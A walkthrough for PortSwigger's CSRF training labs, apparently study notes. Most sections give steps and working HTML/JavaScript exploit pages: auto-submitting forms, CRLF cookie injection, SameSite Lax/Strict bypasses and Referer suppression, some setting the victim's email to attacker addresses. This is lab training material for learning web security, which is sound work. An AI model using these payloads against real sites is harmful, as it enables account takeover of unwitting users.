# PortSwigger CSRF Labs — Walkthrough

---

## Recon

- Look for some functionality you could use in a CSRF attack for account takeover
- Common targets: email change, password change, profile update forms
- Check for CSRF tokens in requests, cookies, and response headers
- Use Burp Suite to intercept and inspect POST requests from authenticated actions

---

## [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

**Steps:**
1. Log in and go to **My Account** → intercept the **change email** request in Burp.
2. Confirm there is no CSRF token or SameSite protection.
3. Go to the **exploit server** and paste the payload into the body.
4. Replace `YOUR-LAB-ID` with your lab ID.
5. Click **Store**, then **Deliver exploit to victim**.

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="anything@web-security-academy.net">
</form> 
<script> 
	document.forms[0].submit(); 
</script>
```

---

## [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

**Steps:**
1. Log in and intercept the **change email** POST request in Burp.
2. Right-click → **Change request method** to convert it to a GET request.
3. Forward the GET request — if it succeeds, the server only validates the CSRF token on POST requests.
4. Go to the exploit server and paste the payload (note: no `method="POST"`, defaults to GET).
5. Replace `YOUR-LAB-ID`, click **Store**, then **Deliver exploit to victim**.

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="anything@web-security-academy.net">
</form> 
<script> 
	document.forms[0].submit(); 
</script>
```

---

## [CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

**Steps:**
1. Log in and intercept the **change email** POST request in Burp.
2. Remove the `csrf` parameter entirely from the request body and forward it.
3. If the request succeeds, the server only validates the token if it's present — omitting it bypasses the check.
4. Go to the exploit server, paste the payload (no csrf field in the form).
5. Replace `YOUR-LAB-ID`, click **Store**, then **Deliver exploit to victim**.

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="anything@web-security-academy.net">
</form> 
<script> 
	document.forms[0].submit(); 
</script>
```

---

## [CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session)

**Steps:**
1. Log in with your own credentials and intercept the **change email** request — note the `csrf` token.
2. **Drop the request** in Burp (do NOT forward it) so the token remains unused.
3. Copy the unused `csrf` token value.
4. Go to the exploit server and paste the payload, inserting your captured token as the `csrf` value.
5. Replace `YOUR-LAB-ID` and `YOUR-CSRF-TOKEN`.
6. Click **Store**, then **Deliver exploit to victim**.
   - Because tokens are not tied to sessions, your valid-but-unused token will work for the victim.

> ⚠️ **Critical:** You must drop the request before the token is consumed, otherwise it won't be valid when the victim uses it.

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="anything@web-security-academy.net"> 
	<input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">	
</form> 
<script> 
	document.forms[0].submit(); 
</script>
```

---

## [CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)

**Steps:**
1. Log in and intercept a **change email** request. Note the `csrf` POST parameter and the `csrfKey` cookie — they are linked but separate from the session cookie.
2. Using a second account (or Burp's "new private window"), capture a valid `csrfKey` cookie and its corresponding `csrf` token value.
3. The exploit works by injecting your `csrfKey` cookie into the victim's browser via a header injection in the search parameter, then submitting the form with the matching `csrf` token.
4. URL-encode the cookie injection string: `%3b%20Secure%3b%20HttpOnly%0d%0aSet-Cookie:%20csrfKey=YOUR-CSRF-KEY%3b%20SameSite=None` injects a `Set-Cookie` header via CRLF injection in the `search` parameter.
5. Replace `YOUR-LAB-ID`, `YOUR-CSRF-TOKEN`, and `YOUR-CSRF-KEY`.
6. Paste into the exploit server, click **Store**, then **Deliver exploit to victim**.

> ⚠️ **Critical:** Change the email address in your exploit so that it doesn't match your own.

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="hacked@web-security-academy.net"> 
	<input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">	
</form> 

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=123%3b%20Secure%3b%20HttpOnly%0d%0aSet-Cookie:%20csrfKey=YOUR-CSRF-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
```


## [CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)

**Steps:**
1. Log in and intercept a **change email** request. Notice the `csrf` cookie and `csrf` POST parameter have the **same value** — the server simply checks they match (double-submit cookie pattern).
2. Since there's no secret tied to the session, you can inject any arbitrary value into both.
3. The exploit uses CRLF injection via the search parameter to set a `csrf` cookie to a known value, then submits the form with the same value as the POST parameter.
4. Replace `YOUR-LAB-ID` and both instances of `YOUR-CSRF-TOKEN` with any arbitrary string (e.g., `faketoken123`).
5. Paste into the exploit server, click **Store**, then **Deliver exploit to victim**.

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker_email@attacker_domain.com">
    <input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=123%3b%20Secure%3b%20HttpOnly%0d%0aSet-Cookie:%20csrf=YOUR-CSRF-TOKEN%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

---

## [SameSite Lax bypass via method override](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override)

**Steps:**
1. Log in and intercept the **change email** request. The cookie has `SameSite=Lax`, which blocks cross-site POST requests but allows top-level GET navigations.
2. In Burp, confirm the server accepts a `_method=POST` override parameter on a GET request (some frameworks honour this for method tunnelling).
3. The exploit redirects the victim's browser to a GET request with `_method=POST` and the email parameter — which the server treats as a POST.
4. Replace `YOUR-LAB-ID`.
5. Paste into the exploit server, click **Store**, then **Deliver exploit to victim**.

```html
<script> 
	document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST"; 
</script>
```

---

## [SameSite Strict bypass via client-side redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)

**Steps:**
1. Log in and observe the cookie has `SameSite=Strict` — cross-site requests will never include the cookie.
2. Find an on-site redirect gadget. The post comment confirmation page at `/post/comment/confirmation?postId=X` performs a client-side redirect using the `postId` parameter.
3. By injecting a path traversal into `postId`, you can redirect the victim to `/my-account/change-email` **from within the same site** — bypassing SameSite Strict because the final request originates from the same origin.
4. The `%26` is a URL-encoded `&` to pass the `submit=1` parameter correctly within the URL.
5. Replace `YOUR-LAB-ID`.
6. Paste into the exploit server, click **Store**, then **Deliver exploit to victim**.

```html
<script> 
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned@web-security-academy.net%26submit=1"; 
</script>
```

---

## [SameSite Strict bypass via sibling domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)

**Need burp collaborator**

---

## [SameSite Lax bypass via cookie refresh](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh)

**Steps:**
1. Log in and observe the cookie does **not** explicitly set `SameSite` — browsers default to `Lax`.
2. Lax cookies are sent on top-level cross-site GET requests **within 2 minutes of the cookie being issued** (the "Lax + POST" exception window).
3. The trick is to force the victim's browser to refresh the OAuth login flow, which re-issues a fresh cookie, then immediately submit the CSRF POST within the 2-minute window.
4. Open a popup to trigger the OAuth flow (refreshing the session cookie), then wait briefly and submit the form.
5. Replace `YOUR-LAB-ID`.
6. Paste into the exploit server, click **Store**, then **Deliver exploit to victim**.

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

---

## [CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present)

**Steps:**
1. Log in and intercept the **change email** request. The server checks the `Referer` header — but only if it's present.
2. If you suppress the `Referer` header entirely, the validation is skipped.
3. Add a `<meta name="referrer" content="no-referrer">` tag to your exploit page — this instructs the browser not to send a `Referer` header with any requests made from the page.
4. Replace `YOUR-LAB-ID`.
5. Paste into the exploit server, click **Store**, then **Deliver exploit to victim**.

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> 
	<input type="hidden" name="email" value="anything@web-security-academy.net">
</form> 
<meta name="referrer" content="no-referrer">	
<script> 
	document.forms[0].submit(); 
</script>
```

---

## [CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)

**Steps:**
1. Log in and intercept the **change email** request. The server validates the `Referer` header but does so weakly — it just checks that the expected domain **appears somewhere** in the URL (e.g., contains `YOUR-LAB-ID.web-security-academy.net`).
2. You can satisfy this check by appending the target domain as a query parameter in your exploit server's URL, so your `Referer` header might look like: `https://exploit-server.net/?YOUR-LAB-ID.web-security-academy.net`.
3. To control the `Referer` header precisely, add the `Referrer-Policy: unsafe-url` response header to your exploit server so the full URL (including query string) is sent as the referrer.
4. In the exploit server **Head** section, add: `Referrer-Policy: unsafe-url`
5. In the **Body**, set your exploit page URL to include the victim domain as a query parameter.
6. Replace `YOUR-LAB-ID`, click **Store**, then **Deliver exploit to victim**.

```html
<html>
    <head>
        <meta name="referrer" content="unsafe-url">
        <title>CSRF-12</title>
    </head>
    <body>
        <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@evil.com">
        </form>

        <script>
            history.pushState('', '', '/?YOUR-LAB-ID.web-security-academy.net')
            document.forms[0].submit();
        </script>
    </body>
</html>

```

> Add to the exploit server **Head**: `Referrer-Policy: unsafe-url`